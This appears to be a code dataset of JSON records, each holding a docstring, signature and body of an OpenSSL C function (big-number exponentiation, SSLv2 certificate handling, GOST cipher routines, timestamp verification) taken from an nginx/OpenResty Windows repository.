{"docstring": "/* The old fallback, simple version :-) */\n", "func_signal": "int BN_mod_exp_simple(BIGNUM *r, const BIGNUM *a, const BIGNUM *p,\n                      const BIGNUM *m, BN_CTX *ctx)", "code": "{\n    int i, j, bits, ret = 0, wstart, wend, window, wvalue;\n    int start = 1;\n    BIGNUM *d;\n    /* Table of variables obtained from 'ctx' */\n    BIGNUM *val[TABLE_SIZE];\n\n    if (BN_get_flags(p, BN_FLG_CONSTTIME) != 0) {\n        /* BN_FLG_CONSTTIME only supported by BN_mod_exp_mont() */\n        BNerr(BN_F_BN_MOD_EXP_SIMPLE, ERR_R_SHOULD_NOT_HAVE_BEEN_CALLED);\n        return -1;\n    }\n\n    bits = BN_num_bits(p);\n   if (bits == 0) {\n        /* x**0 mod 1 is still zero. */\n        if (BN_is_one(m)) {\n            ret = 1;\n            BN_zero(r);\n        } else {\n            ret = BN_one(r);\n        }\n        return ret;\n    }\n\n    BN_CTX_start(ctx);\n    d = BN_CTX_get(ctx);\n    val[0] = BN_CTX_get(ctx);\n    if (!d || !val[0])\n        goto err;\n\n    if (!BN_nnmod(val[0], a, m, ctx))\n        goto err;               /* 1 */\n    if (BN_is_zero(val[0])) {\n        BN_zero(r);\n        ret = 1;\n        goto err;\n    }\n\n    window = BN_window_bits_for_exponent_size(bits);\n    if (window > 1) {\n        if (!BN_mod_mul(d, val[0], val[0], m, ctx))\n            goto err;           /* 2 */\n        j = 1 << (window - 1);\n        for (i = 1; i < j; i++) {\n            if (((val[i] = BN_CTX_get(ctx)) == NULL) ||\n                !BN_mod_mul(val[i], val[i - 1], d, m, ctx))\n                goto err;\n        }\n    }\n\n    start = 1;                  /* This is used to avoid multiplication etc\n                                 * when there is only the value '1' in the\n                                 * buffer. */\n    wvalue = 0;                 /* The 'value' of the window */\n    wstart = bits - 1;          /* The top bit of the window */\n    wend = 0;                   /* The bottom bit of the window */\n\n    if (!BN_one(r))\n        goto err;\n\n    for (;;) {\n        if (BN_is_bit_set(p, wstart) == 0) {\n            if (!start)\n                if (!BN_mod_mul(r, r, r, m, ctx))\n                    goto err;\n            if (wstart == 0)\n                break;\n            wstart--;\n            continue;\n        }\n        /*\n         * We now have wstart on a 'set' bit, we now need to work out how bit\n         * a window to do.  To do this we need to scan forward until the last\n         * set bit before the end of the window\n         */\n        j = wstart;\n        wvalue = 1;\n        wend = 0;\n        for (i = 1; i < window; i++) {\n            if (wstart - i < 0)\n                break;\n            if (BN_is_bit_set(p, wstart - i)) {\n                wvalue <<= (i - wend);\n                wvalue |= 1;\n                wend = i;\n            }\n        }\n\n        /* wend is the size of the current window */\n        j = wend + 1;\n        /* add the 'bytes above' */\n        if (!start)\n            for (i = 0; i < j; i++) {\n                if (!BN_mod_mul(r, r, r, m, ctx))\n                    goto err;\n            }\n\n        /* wvalue will be an odd number < 2^window */\n        if (!BN_mod_mul(r, r, val[wvalue >> 1], m, ctx))\n            goto err;\n\n        /* move the 'window' down further */\n        wstart -= wend + 1;\n        wvalue = 0;\n        start = 0;\n        if (wstart < 0)\n            break;\n    }\n    ret = 1;\n err:\n    BN_CTX_end(ctx);\n    bn_check_top(r);\n    return (ret);\n}", "path": "src\\nginx\\objs\\lib\\openssl\\crypto\\bn\\bn_exp.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* loads in the certificate from the server */\n", "func_signal": "int ssl2_set_certificate(SSL *s, int type, int len, const unsigned char *data)", "code": "{\n    STACK_OF(X509) *sk = NULL;\n    EVP_PKEY *pkey = NULL;\n    SESS_CERT *sc = NULL;\n    int i;\n    X509 *x509 = NULL;\n    int ret = 0;\n\n    x509 = d2i_X509(NULL, &data, (long)len);\n    if (x509 == NULL) {\n        SSLerr(SSL_F_SSL2_SET_CERTIFICATE, ERR_R_X509_LIB);\n        goto err;\n    }\n\n    if ((sk = sk_X509_new_null()) == NULL || !sk_X509_push(sk, x509)) {\n        SSLerr(SSL_F_SSL2_SET_CERTIFICATE, ERR_R_MALLOC_FAILURE);\n        goto err;\n    }\n\n    i = ssl_verify_cert_chain(s, sk);\n\n    if ((s->verify_mode != SSL_VERIFY_NONE) && (i <= 0)) {\n        SSLerr(SSL_F_SSL2_SET_CERTIFICATE, SSL_R_CERTIFICATE_VERIFY_FAILED);\n        goto err;\n    }\n    ERR_clear_error();          /* but we keep s->verify_result */\n    s->session->verify_result = s->verify_result;\n\n    /* server's cert for this session */\n    sc = ssl_sess_cert_new();\n    if (sc == NULL) {\n        ret = -1;\n        goto err;\n    }\n    if (s->session->sess_cert)\n        ssl_sess_cert_free(s->session->sess_cert);\n    s->session->sess_cert = sc;\n\n    sc->peer_pkeys[SSL_PKEY_RSA_ENC].x509 = x509;\n    sc->peer_key = &(sc->peer_pkeys[SSL_PKEY_RSA_ENC]);\n\n    pkey = X509_get_pubkey(x509);\n    x509 = NULL;\n    if (pkey == NULL) {\n        SSLerr(SSL_F_SSL2_SET_CERTIFICATE,\n               SSL_R_UNABLE_TO_EXTRACT_PUBLIC_KEY);\n        goto err;\n    }\n    if (pkey->type != EVP_PKEY_RSA) {\n        SSLerr(SSL_F_SSL2_SET_CERTIFICATE, SSL_R_PUBLIC_KEY_NOT_RSA);\n        goto err;\n    }\n\n    if (!ssl_set_peer_cert_type(sc, SSL2_CT_X509_CERTIFICATE))\n        goto err;\n    ret = 1;\n err:\n    sk_X509_free(sk);\n    X509_free(x509);\n    EVP_PKEY_free(pkey);\n    return (ret);\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\ssl\\s2_clnt.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/*\n * This variant of BN_mod_exp_mont() uses fixed windows and the special\n * precomputation memory layout to limit data-dependency to a minimum to\n * protect secret exponents (cf. the hyper-threading timing attacks pointed\n * out by Colin Percival,\n * http://www.daemonology.net/hyperthreading-considered-harmful/)\n */\n", "func_signal": "int BN_mod_exp_mont_consttime(BIGNUM *rr, const BIGNUM *a, const BIGNUM *p,\n                              const BIGNUM *m, BN_CTX *ctx,\n                              BN_MONT_CTX *in_mont)", "code": "{\n    int i, bits, ret = 0, window, wvalue;\n    int top;\n    BN_MONT_CTX *mont = NULL;\n\n    int numPowers;\n    unsigned char *powerbufFree = NULL;\n    int powerbufLen = 0;\n    unsigned char *powerbuf = NULL;\n    BIGNUM tmp, am;\n#if defined(SPARC_T4_MONT)\n    unsigned int t4 = 0;\n#endif\n\n    bn_check_top(a);\n    bn_check_top(p);\n    bn_check_top(m);\n\n    if (!BN_is_odd(m)) {\n        BNerr(BN_F_BN_MOD_EXP_MONT_CONSTTIME, BN_R_CALLED_WITH_EVEN_MODULUS);\n        return (0);\n    }\n\n    top = m->top;\n\n    bits = BN_num_bits(p);\n    if (bits == 0) {\n        /* x**0 mod 1 is still zero. */\n        if (BN_is_one(m)) {\n            ret = 1;\n            BN_zero(rr);\n        } else {\n            ret = BN_one(rr);\n        }\n        return ret;\n    }\n\n    BN_CTX_start(ctx);\n\n    /*\n     * Allocate a montgomery context if it was not supplied by the caller. If\n     * this is not done, things will break in the montgomery part.\n     */\n    if (in_mont != NULL)\n        mont = in_mont;\n    else {\n        if ((mont = BN_MONT_CTX_new()) == NULL)\n            goto err;\n        if (!BN_MONT_CTX_set(mont, m, ctx))\n            goto err;\n    }\n\n#ifdef RSAZ_ENABLED\n    /*\n     * If the size of the operands allow it, perform the optimized\n     * RSAZ exponentiation. For further information see\n     * crypto/bn/rsaz_exp.c and accompanying assembly modules.\n     */\n    if ((16 == a->top) && (16 == p->top) && (BN_num_bits(m) == 1024)\n        && rsaz_avx2_eligible()) {\n        if (NULL == bn_wexpand(rr, 16))\n            goto err;\n        RSAZ_1024_mod_exp_avx2(rr->d, a->d, p->d, m->d, mont->RR.d,\n                               mont->n0[0]);\n        rr->top = 16;\n        rr->neg = 0;\n        bn_correct_top(rr);\n        ret = 1;\n        goto err;\n    } else if ((8 == a->top) && (8 == p->top) && (BN_num_bits(m) == 512)) {\n        if (NULL == bn_wexpand(rr, 8))\n            goto err;\n        RSAZ_512_mod_exp(rr->d, a->d, p->d, m->d, mont->n0[0], mont->RR.d);\n        rr->top = 8;\n        rr->neg = 0;\n        bn_correct_top(rr);\n        ret = 1;\n        goto err;\n    }\n#endif\n\n    /* Get the window size to use with size of p. */\n    window = BN_window_bits_for_ctime_exponent_size(bits);\n#if defined(SPARC_T4_MONT)\n    if (window >= 5 && (top & 15) == 0 && top <= 64 &&\n        (OPENSSL_sparcv9cap_P[1] & (CFR_MONTMUL | CFR_MONTSQR)) ==\n        (CFR_MONTMUL | CFR_MONTSQR) && (t4 = OPENSSL_sparcv9cap_P[0]))\n        window = 5;\n    else\n#endif\n#if defined(OPENSSL_BN_ASM_MONT5)\n    if (window >= 5) {\n        window = 5;             /* ~5% improvement for RSA2048 sign, and even\n                                 * for RSA4096 */\n        /* reserve space for mont->N.d[] copy */\n        powerbufLen += top * sizeof(mont->N.d[0]);\n    }\n#endif\n    (void)0;\n\n    /*\n     * Allocate a buffer large enough to hold all of the pre-computed powers\n     * of am, am itself and tmp.\n     */\n    numPowers = 1 << window;\n    powerbufLen += sizeof(m->d[0]) * (top * numPowers +\n                                      ((2 * top) >\n                                       numPowers ? (2 * top) : numPowers));\n#ifdef alloca\n    if (powerbufLen < 3072)\n        powerbufFree =\n            alloca(powerbufLen + MOD_EXP_CTIME_MIN_CACHE_LINE_WIDTH);\n    else\n#endif\n        if ((powerbufFree =\n             (unsigned char *)OPENSSL_malloc(powerbufLen +\n                                             MOD_EXP_CTIME_MIN_CACHE_LINE_WIDTH))\n            == NULL)\n        goto err;\n\n    powerbuf = MOD_EXP_CTIME_ALIGN(powerbufFree);\n    memset(powerbuf, 0, powerbufLen);\n\n#ifdef alloca\n    if (powerbufLen < 3072)\n        powerbufFree = NULL;\n#endif\n\n    /* lay down tmp and am right after powers table */\n    tmp.d = (BN_ULONG *)(powerbuf + sizeof(m->d[0]) * top * numPowers);\n    am.d = tmp.d + top;\n    tmp.top = am.top = 0;\n    tmp.dmax = am.dmax = top;\n    tmp.neg = am.neg = 0;\n    tmp.flags = am.flags = BN_FLG_STATIC_DATA;\n\n    /* prepare a^0 in Montgomery domain */\n#if 1                           /* by Shay Gueron's suggestion */\n    if (m->d[top - 1] & (((BN_ULONG)1) << (BN_BITS2 - 1))) {\n        /* 2^(top*BN_BITS2) - m */\n        tmp.d[0] = (0 - m->d[0]) & BN_MASK2;\n        for (i = 1; i < top; i++)\n            tmp.d[i] = (~m->d[i]) & BN_MASK2;\n        tmp.top = top;\n    } else\n#endif\n    if (!BN_to_montgomery(&tmp, BN_value_one(), mont, ctx))\n        goto err;\n\n    /* prepare a^1 in Montgomery domain */\n    if (a->neg || BN_ucmp(a, m) >= 0) {\n        if (!BN_mod(&am, a, m, ctx))\n            goto err;\n        if (!BN_to_montgomery(&am, &am, mont, ctx))\n            goto err;\n    } else if (!BN_to_montgomery(&am, a, mont, ctx))\n        goto err;\n\n#if defined(SPARC_T4_MONT)\n    if (t4) {\n        typedef int (*bn_pwr5_mont_f) (BN_ULONG *tp, const BN_ULONG *np,\n                                       const BN_ULONG *n0, const void *table,\n                                       int power, int bits);\n        int bn_pwr5_mont_t4_8(BN_ULONG *tp, const BN_ULONG *np,\n                              const BN_ULONG *n0, const void *table,\n                              int power, int bits);\n        int bn_pwr5_mont_t4_16(BN_ULONG *tp, const BN_ULONG *np,\n                               const BN_ULONG *n0, const void *table,\n                               int power, int bits);\n        int bn_pwr5_mont_t4_24(BN_ULONG *tp, const BN_ULONG *np,\n                               const BN_ULONG *n0, const void *table,\n                               int power, int bits);\n        int bn_pwr5_mont_t4_32(BN_ULONG *tp, const BN_ULONG *np,\n                               const BN_ULONG *n0, const void *table,\n                               int power, int bits);\n        static const bn_pwr5_mont_f pwr5_funcs[4] = {\n            bn_pwr5_mont_t4_8, bn_pwr5_mont_t4_16,\n            bn_pwr5_mont_t4_24, bn_pwr5_mont_t4_32\n        };\n        bn_pwr5_mont_f pwr5_worker = pwr5_funcs[top / 16 - 1];\n\n        typedef int (*bn_mul_mont_f) (BN_ULONG *rp, const BN_ULONG *ap,\n                                      const void *bp, const BN_ULONG *np,\n                                      const BN_ULONG *n0);\n        int bn_mul_mont_t4_8(BN_ULONG *rp, const BN_ULONG *ap, const void *bp,\n                             const BN_ULONG *np, const BN_ULONG *n0);\n        int bn_mul_mont_t4_16(BN_ULONG *rp, const BN_ULONG *ap,\n                              const void *bp, const BN_ULONG *np,\n                              const BN_ULONG *n0);\n        int bn_mul_mont_t4_24(BN_ULONG *rp, const BN_ULONG *ap,\n                              const void *bp, const BN_ULONG *np,\n                              const BN_ULONG *n0);\n        int bn_mul_mont_t4_32(BN_ULONG *rp, const BN_ULONG *ap,\n                              const void *bp, const BN_ULONG *np,\n                              const BN_ULONG *n0);\n        static const bn_mul_mont_f mul_funcs[4] = {\n            bn_mul_mont_t4_8, bn_mul_mont_t4_16,\n            bn_mul_mont_t4_24, bn_mul_mont_t4_32\n        };\n        bn_mul_mont_f mul_worker = mul_funcs[top / 16 - 1];\n\n        void bn_mul_mont_vis3(BN_ULONG *rp, const BN_ULONG *ap,\n                              const void *bp, const BN_ULONG *np,\n                              const BN_ULONG *n0, int num);\n        void bn_mul_mont_t4(BN_ULONG *rp, const BN_ULONG *ap,\n                            const void *bp, const BN_ULONG *np,\n                            const BN_ULONG *n0, int num);\n        void bn_mul_mont_gather5_t4(BN_ULONG *rp, const BN_ULONG *ap,\n                                    const void *table, const BN_ULONG *np,\n                                    const BN_ULONG *n0, int num, int power);\n        void bn_flip_n_scatter5_t4(const BN_ULONG *inp, size_t num,\n                                   void *table, size_t power);\n        void bn_gather5_t4(BN_ULONG *out, size_t num,\n                           void *table, size_t power);\n        void bn_flip_t4(BN_ULONG *dst, BN_ULONG *src, size_t num);\n\n        BN_ULONG *np = mont->N.d, *n0 = mont->n0;\n        int stride = 5 * (6 - (top / 16 - 1)); /* multiple of 5, but less\n                                                * than 32 */\n\n        /*\n         * BN_to_montgomery can contaminate words above .top [in\n         * BN_DEBUG[_DEBUG] build]...\n         */\n        for (i = am.top; i < top; i++)\n            am.d[i] = 0;\n        for (i = tmp.top; i < top; i++)\n            tmp.d[i] = 0;\n\n        bn_flip_n_scatter5_t4(tmp.d, top, powerbuf, 0);\n        bn_flip_n_scatter5_t4(am.d, top, powerbuf, 1);\n        if (!(*mul_worker) (tmp.d, am.d, am.d, np, n0) &&\n            !(*mul_worker) (tmp.d, am.d, am.d, np, n0))\n            bn_mul_mont_vis3(tmp.d, am.d, am.d, np, n0, top);\n        bn_flip_n_scatter5_t4(tmp.d, top, powerbuf, 2);\n\n        for (i = 3; i < 32; i++) {\n            /* Calculate a^i = a^(i-1) * a */\n            if (!(*mul_worker) (tmp.d, tmp.d, am.d, np, n0) &&\n                !(*mul_worker) (tmp.d, tmp.d, am.d, np, n0))\n                bn_mul_mont_vis3(tmp.d, tmp.d, am.d, np, n0, top);\n            bn_flip_n_scatter5_t4(tmp.d, top, powerbuf, i);\n        }\n\n        /* switch to 64-bit domain */\n        np = alloca(top * sizeof(BN_ULONG));\n        top /= 2;\n        bn_flip_t4(np, mont->N.d, top);\n\n        bits--;\n        for (wvalue = 0, i = bits % 5; i >= 0; i--, bits--)\n            wvalue = (wvalue << 1) + BN_is_bit_set(p, bits);\n        bn_gather5_t4(tmp.d, top, powerbuf, wvalue);\n\n        /*\n         * Scan the exponent one window at a time starting from the most\n         * significant bits.\n         */\n        while (bits >= 0) {\n            if (bits < stride)\n                stride = bits + 1;\n            bits -= stride;\n            wvalue = bn_get_bits(p, bits + 1);\n\n            if ((*pwr5_worker) (tmp.d, np, n0, powerbuf, wvalue, stride))\n                continue;\n            /* retry once and fall back */\n            if ((*pwr5_worker) (tmp.d, np, n0, powerbuf, wvalue, stride))\n                continue;\n\n            bits += stride - 5;\n            wvalue >>= stride - 5;\n            wvalue &= 31;\n            bn_mul_mont_t4(tmp.d, tmp.d, tmp.d, np, n0, top);\n            bn_mul_mont_t4(tmp.d, tmp.d, tmp.d, np, n0, top);\n            bn_mul_mont_t4(tmp.d, tmp.d, tmp.d, np, n0, top);\n            bn_mul_mont_t4(tmp.d, tmp.d, tmp.d, np, n0, top);\n            bn_mul_mont_t4(tmp.d, tmp.d, tmp.d, np, n0, top);\n            bn_mul_mont_gather5_t4(tmp.d, tmp.d, powerbuf, np, n0, top,\n                                   wvalue);\n        }\n\n        bn_flip_t4(tmp.d, tmp.d, top);\n        top *= 2;\n        /* back to 32-bit domain */\n        tmp.top = top;\n        bn_correct_top(&tmp);\n        OPENSSL_cleanse(np, top * sizeof(BN_ULONG));\n    } else\n#endif\n#if defined(OPENSSL_BN_ASM_MONT5)\n    if (window == 5 && top > 1) {\n        /*\n         * This optimization uses ideas from http://eprint.iacr.org/2011/239,\n         * specifically optimization of cache-timing attack countermeasures\n         * and pre-computation optimization.\n         */\n\n        /*\n         * Dedicated window==4 case improves 512-bit RSA sign by ~15%, but as\n         * 512-bit RSA is hardly relevant, we omit it to spare size...\n         */\n        void bn_mul_mont_gather5(BN_ULONG *rp, const BN_ULONG *ap,\n                                 const void *table, const BN_ULONG *np,\n                                 const BN_ULONG *n0, int num, int power);\n        void bn_scatter5(const BN_ULONG *inp, size_t num,\n                         void *table, size_t power);\n        void bn_gather5(BN_ULONG *out, size_t num, void *table, size_t power);\n        void bn_power5(BN_ULONG *rp, const BN_ULONG *ap,\n                       const void *table, const BN_ULONG *np,\n                       const BN_ULONG *n0, int num, int power);\n        int bn_get_bits5(const BN_ULONG *ap, int off);\n        int bn_from_montgomery(BN_ULONG *rp, const BN_ULONG *ap,\n                               const BN_ULONG *not_used, const BN_ULONG *np,\n                               const BN_ULONG *n0, int num);\n\n        BN_ULONG *n0 = mont->n0, *np;\n\n        /*\n         * BN_to_montgomery can contaminate words above .top [in\n         * BN_DEBUG[_DEBUG] build]...\n         */\n        for (i = am.top; i < top; i++)\n            am.d[i] = 0;\n        for (i = tmp.top; i < top; i++)\n            tmp.d[i] = 0;\n\n        /*\n         * copy mont->N.d[] to improve cache locality\n         */\n        for (np = am.d + top, i = 0; i < top; i++)\n            np[i] = mont->N.d[i];\n\n        bn_scatter5(tmp.d, top, powerbuf, 0);\n        bn_scatter5(am.d, am.top, powerbuf, 1);\n        bn_mul_mont(tmp.d, am.d, am.d, np, n0, top);\n        bn_scatter5(tmp.d, top, powerbuf, 2);\n\n# if 0\n        for (i = 3; i < 32; i++) {\n            /* Calculate a^i = a^(i-1) * a */\n            bn_mul_mont_gather5(tmp.d, am.d, powerbuf, np, n0, top, i - 1);\n            bn_scatter5(tmp.d, top, powerbuf, i);\n        }\n# else\n        /* same as above, but uses squaring for 1/2 of operations */\n        for (i = 4; i < 32; i *= 2) {\n            bn_mul_mont(tmp.d, tmp.d, tmp.d, np, n0, top);\n            bn_scatter5(tmp.d, top, powerbuf, i);\n        }\n        for (i = 3; i < 8; i += 2) {\n            int j;\n            bn_mul_mont_gather5(tmp.d, am.d, powerbuf, np, n0, top, i - 1);\n            bn_scatter5(tmp.d, top, powerbuf, i);\n            for (j = 2 * i; j < 32; j *= 2) {\n                bn_mul_mont(tmp.d, tmp.d, tmp.d, np, n0, top);\n                bn_scatter5(tmp.d, top, powerbuf, j);\n            }\n        }\n        for (; i < 16; i += 2) {\n            bn_mul_mont_gather5(tmp.d, am.d, powerbuf, np, n0, top, i - 1);\n            bn_scatter5(tmp.d, top, powerbuf, i);\n            bn_mul_mont(tmp.d, tmp.d, tmp.d, np, n0, top);\n            bn_scatter5(tmp.d, top, powerbuf, 2 * i);\n        }\n        for (; i < 32; i += 2) {\n            bn_mul_mont_gather5(tmp.d, am.d, powerbuf, np, n0, top, i - 1);\n            bn_scatter5(tmp.d, top, powerbuf, i);\n        }\n# endif\n        bits--;\n        for (wvalue = 0, i = bits % 5; i >= 0; i--, bits--)\n            wvalue = (wvalue << 1) + BN_is_bit_set(p, bits);\n        bn_gather5(tmp.d, top, powerbuf, wvalue);\n\n        /*\n         * Scan the exponent one window at a time starting from the most\n         * significant bits.\n         */\n        if (top & 7)\n            while (bits >= 0) {\n                for (wvalue = 0, i = 0; i < 5; i++, bits--)\n                    wvalue = (wvalue << 1) + BN_is_bit_set(p, bits);\n\n                bn_mul_mont(tmp.d, tmp.d, tmp.d, np, n0, top);\n                bn_mul_mont(tmp.d, tmp.d, tmp.d, np, n0, top);\n                bn_mul_mont(tmp.d, tmp.d, tmp.d, np, n0, top);\n                bn_mul_mont(tmp.d, tmp.d, tmp.d, np, n0, top);\n                bn_mul_mont(tmp.d, tmp.d, tmp.d, np, n0, top);\n                bn_mul_mont_gather5(tmp.d, tmp.d, powerbuf, np, n0, top,\n                                    wvalue);\n        } else {\n            while (bits >= 0) {\n                wvalue = bn_get_bits5(p->d, bits - 4);\n                bits -= 5;\n                bn_power5(tmp.d, tmp.d, powerbuf, np, n0, top, wvalue);\n            }\n        }\n\n        ret = bn_from_montgomery(tmp.d, tmp.d, NULL, np, n0, top);\n        tmp.top = top;\n        bn_correct_top(&tmp);\n        if (ret) {\n            if (!BN_copy(rr, &tmp))\n                ret = 0;\n            goto err;           /* non-zero ret means it's not error */\n        }\n    } else\n#endif\n    {\n        if (!MOD_EXP_CTIME_COPY_TO_PREBUF(&tmp, top, powerbuf, 0, window))\n            goto err;\n        if (!MOD_EXP_CTIME_COPY_TO_PREBUF(&am, top, powerbuf, 1, window))\n            goto err;\n\n        /*\n         * If the window size is greater than 1, then calculate\n         * val[i=2..2^winsize-1]. Powers are computed as a*a^(i-1) (even\n         * powers could instead be computed as (a^(i/2))^2 to use the slight\n         * performance advantage of sqr over mul).\n         */\n        if (window > 1) {\n            if (!BN_mod_mul_montgomery(&tmp, &am, &am, mont, ctx))\n                goto err;\n            if (!MOD_EXP_CTIME_COPY_TO_PREBUF(&tmp, top, powerbuf, 2,\n                                              window))\n                goto err;\n            for (i = 3; i < numPowers; i++) {\n                /* Calculate a^i = a^(i-1) * a */\n                if (!BN_mod_mul_montgomery(&tmp, &am, &tmp, mont, ctx))\n                    goto err;\n                if (!MOD_EXP_CTIME_COPY_TO_PREBUF(&tmp, top, powerbuf, i,\n                                                  window))\n                    goto err;\n            }\n        }\n\n        bits--;\n        for (wvalue = 0, i = bits % window; i >= 0; i--, bits--)\n            wvalue = (wvalue << 1) + BN_is_bit_set(p, bits);\n        if (!MOD_EXP_CTIME_COPY_FROM_PREBUF(&tmp, top, powerbuf, wvalue,\n                                            window))\n            goto err;\n\n        /*\n         * Scan the exponent one window at a time starting from the most\n         * significant bits.\n         */\n        while (bits >= 0) {\n            wvalue = 0;         /* The 'value' of the window */\n\n            /* Scan the window, squaring the result as we go */\n            for (i = 0; i < window; i++, bits--) {\n                if (!BN_mod_mul_montgomery(&tmp, &tmp, &tmp, mont, ctx))\n                    goto err;\n                wvalue = (wvalue << 1) + BN_is_bit_set(p, bits);\n            }\n\n            /*\n             * Fetch the appropriate pre-computed value from the pre-buf\n             */\n            if (!MOD_EXP_CTIME_COPY_FROM_PREBUF(&am, top, powerbuf, wvalue,\n                                                window))\n                goto err;\n\n            /* Multiply the result into the intermediate result */\n            if (!BN_mod_mul_montgomery(&tmp, &tmp, &am, mont, ctx))\n                goto err;\n        }\n    }\n\n    /* Convert the final result from montgomery to standard format */\n#if defined(SPARC_T4_MONT)\n    if (OPENSSL_sparcv9cap_P[0] & (SPARCV9_VIS3 | SPARCV9_PREFER_FPU)) {\n        am.d[0] = 1;            /* borrow am */\n        for (i = 1; i < top; i++)\n            am.d[i] = 0;\n        if (!BN_mod_mul_montgomery(rr, &tmp, &am, mont, ctx))\n            goto err;\n    } else\n#endif\n    if (!BN_from_montgomery(rr, &tmp, mont, ctx))\n        goto err;\n    ret = 1;\n err:\n    if ((in_mont == NULL) && (mont != NULL))\n        BN_MONT_CTX_free(mont);\n    if (powerbuf != NULL) {\n        OPENSSL_cleanse(powerbuf, powerbufLen);\n        if (powerbufFree)\n            OPENSSL_free(powerbufFree);\n    }\n    BN_CTX_end(ctx);\n    return (ret);\n}", "path": "src\\nginx\\objs\\lib\\openssl\\crypto\\bn\\bn_exp.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* Implements key meshing algorithm by modifing ctx and IV in place */\n", "func_signal": "void cryptopro_key_meshing(gost_ctx * ctx, unsigned char *iv)", "code": "{\n    unsigned char newkey[32], newiv[8];\n    /* Set static keymeshing key */\n    /* \"Decrypt\" key with keymeshing key */\n    gost_dec(ctx, CryptoProKeyMeshingKey, newkey, 4);\n    /* set new key */\n    gost_key(ctx, newkey);\n    /* Encrypt iv with new key */\n    gostcrypt(ctx, iv, newiv);\n    memcpy(iv, newiv, 8);\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\engines\\ccgost\\gost89.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* Initialization of gost_ctx subst blocks*/\n", "func_signal": "static void kboxinit(gost_ctx * c, const gost_subst_block * b)", "code": "{\n    int i;\n\n    for (i = 0; i < 256; i++) {\n        c->k87[i] = (word32) (b->k8[i >> 4] << 4 | b->k7[i & 15]) << 24;\n        c->k65[i] = (b->k6[i >> 4] << 4 | b->k5[i & 15]) << 16;\n        c->k43[i] = (b->k4[i >> 4] << 4 | b->k3[i & 15]) << 8;\n        c->k21[i] = b->k2[i >> 4] << 4 | b->k1[i & 15];\n\n    }\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\engines\\ccgost\\gost89.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/*-\n * Verifies whether 'response' contains a valid response with regards\n * to the settings of the context:\n *      - Gives an error message if the TS_TST_INFO is not present.\n *      - Calls _TS_RESP_verify_token to verify the token content.\n */\n", "func_signal": "int TS_RESP_verify_response(TS_VERIFY_CTX *ctx, TS_RESP *response)", "code": "{\n    PKCS7 *token = TS_RESP_get_token(response);\n    TS_TST_INFO *tst_info = TS_RESP_get_tst_info(response);\n    int ret = 0;\n\n    /* Check if we have a successful TS_TST_INFO object in place. */\n    if (!TS_check_status_info(response))\n        goto err;\n\n    /* Check the contents of the time stamp token. */\n    if (!int_TS_RESP_verify_token(ctx, token, tst_info))\n        goto err;\n\n    ret = 1;\n err:\n    return ret;\n}", "path": "src\\nginx\\objs\\lib\\openssl\\crypto\\ts\\ts_rsp_verify.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/*\n * BN_mod_exp_mont_consttime() stores the precomputed powers in a specific\n * layout so that accessing any of these table values shows the same access\n * pattern as far as cache lines are concerned.  The following functions are\n * used to transfer a BIGNUM from/to that table.\n */\n", "func_signal": "static int MOD_EXP_CTIME_COPY_TO_PREBUF(const BIGNUM *b, int top,\n                                        unsigned char *buf, int idx,\n                                        int window)", "code": "{\n    int i, j;\n    int width = 1 << window;\n    BN_ULONG *table = (BN_ULONG *)buf;\n\n    if (top > b->top)\n        top = b->top;           /* this works because 'buf' is explicitly\n                                 * zeroed */\n    for (i = 0, j = idx; i < top; i++, j += width) {\n        table[j] = b->d[i];\n    }\n\n    return 1;\n}", "path": "src\\nginx\\objs\\lib\\openssl\\crypto\\bn\\bn_exp.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* Returns < 0 if certificate is not found, certificate index otherwise. */\n", "func_signal": "static int TS_find_cert(STACK_OF(ESS_CERT_ID) *cert_ids, X509 *cert)", "code": "{\n    int i;\n\n    if (!cert_ids || !cert)\n        return -1;\n\n    /* Recompute SHA1 hash of certificate if necessary (side effect). */\n    X509_check_purpose(cert, -1, 0);\n\n    /* Look for cert in the cert_ids vector. */\n    for (i = 0; i < sk_ESS_CERT_ID_num(cert_ids); ++i) {\n        ESS_CERT_ID *cid = sk_ESS_CERT_ID_value(cert_ids, i);\n\n        /* Check the SHA-1 hash first. */\n        if (cid->hash->length == sizeof(cert->sha1_hash)\n            && !memcmp(cid->hash->data, cert->sha1_hash,\n                       sizeof(cert->sha1_hash))) {\n            /* Check the issuer/serial as well if specified. */\n            ESS_ISSUER_SERIAL *is = cid->issuer_serial;\n            if (!is || !TS_issuer_serial_cmp(is, cert->cert_info))\n                return i;\n        }\n    }\n\n    return -1;\n}", "path": "src\\nginx\\objs\\lib\\openssl\\crypto\\ts\\ts_rsp_verify.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* Compute MAC with non-zero IV. Used in some RFC 4357 algorithms */\n", "func_signal": "int gost_mac_iv(gost_ctx * ctx, int mac_len, const unsigned char *iv,\n                const unsigned char *data, unsigned int data_len,\n                unsigned char *mac)", "code": "{\n    byte buffer[8];\n    byte buf2[8];\n    unsigned int i;\n    memcpy(buffer, iv, 8);\n    for (i = 0; i + 8 <= data_len; i += 8)\n        mac_block(ctx, buffer, data + i);\n    if (i < data_len) {\n        memset(buf2, 0, 8);\n        memcpy(buf2, data + i, data_len - i);\n        mac_block(ctx, buffer, buf2);\n        i += 8;\n    }\n    if (i == 8) {\n        memset(buf2, 0, 8);\n        mac_block(ctx, buffer, buf2);\n    }\n    get_mac(buffer, mac_len, mac);\n    return 1;\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\engines\\ccgost\\gost89.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
